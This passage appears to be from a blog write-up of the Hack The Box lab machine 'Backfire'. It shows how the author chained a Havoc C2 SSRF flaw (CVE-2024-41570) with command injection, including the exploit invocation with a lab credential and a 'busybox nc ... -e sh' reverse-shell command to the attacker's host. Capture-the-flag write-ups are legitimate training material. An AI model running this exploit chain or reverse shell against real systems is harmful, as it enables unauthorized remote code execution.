&lt;p>These files suggest that the exploitation will rely on one or more vulnerabilities related to the Havoc command and control (C2) server.&lt;/p>
&lt;p>After some digging, we came across this exploit: &lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
>https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE&lt;/a>.&lt;br>
This exploit combines two vulnerabilities:&lt;/p>
&lt;ul>
&lt;li>CVE-2024-41570, which exploits an SSRF flaw to open a TCP socket on the main server (teamserver) allowing data read/write.&lt;/li>
&lt;li>A command injection that lets an authenticated user execute commands on that server.&lt;/li>
&lt;/ul>
&lt;p>After installing the Havoc framework, we launch both the server and the client.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">verbose&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">debug&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">profile&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Tlchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">DBUG&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">func2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="nx">Debug&lt;/span> &lt;span class="nx">mode&lt;/span> &lt;span class="nx">enabled&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Tlchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Build&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x64&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x86&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Nasm&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">nasm&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Time&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mo">04&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mo">06&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc.png"
width="505"
height="288"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_d59ee651e3ee545e.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_efc7451f6cb1d4b1.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="175"
data-flex-basis="420px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">client&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">loaded&lt;/span> &lt;span class="nx">config&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toml&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Connecting&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">HTB&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;:&lt;/span>&lt;span class="mi">114&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">SyntaxWarning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">escape&lt;/span> &lt;span class="nx">sequence&lt;/span> &lt;span class="err">&amp;#39;\&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Started&lt;/span> &lt;span class="s">&amp;#34;Demon Listener&amp;#34;&lt;/span> &lt;span class="nx">listener&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Using the &lt;code>Ilya&lt;/code> account retrieved from the Havoc configuration file, we run the exploit with the following command to gain a reverse shell on the server:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">41570.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">t&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P &amp;#39;CobaltStr1keSuckz!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">register&lt;/span> &lt;span class="nx">agent&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">teamserver&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">poll&lt;/span> &lt;span class="nx">teamserver&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Read&lt;/span> &lt;span class="nx">socket&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">successfully&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Enter&lt;/span> &lt;span class="nx">command&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">execute&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">busybox&lt;/span> &lt;span class="nx">nc&lt;/span> &lt;span class="mf">10.10.14.173&lt;/span> &lt;span class="mi">80&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">write&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Success&lt;/span>&lt;span class="p">!&lt;/span>
